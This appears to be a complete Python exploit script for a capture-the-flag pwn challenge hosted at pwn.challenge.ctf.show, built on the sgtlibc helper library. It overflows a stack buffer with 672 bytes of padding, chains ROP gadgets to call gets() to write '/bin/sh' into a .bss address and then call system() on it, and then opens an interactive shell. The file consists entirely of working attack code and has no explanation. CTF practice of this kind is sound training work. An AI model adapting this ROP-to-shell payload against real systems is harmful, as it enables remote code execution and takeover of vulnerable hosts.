import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./pwn',
    remote='pwn.challenge.ctf.show 28056',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

payload = [b'a'*672, fakeebp()]
bss_align20_addr = 0x00601079
payload += [elf.rop['rdi'], bss_align20_addr, elf.plt['gets']]
payload += [elf.rop['rdi'], bss_align20_addr, elf.plt['system']]
pause()
sl(payload)
sl(b'/bin/sh\x00')
interactive()
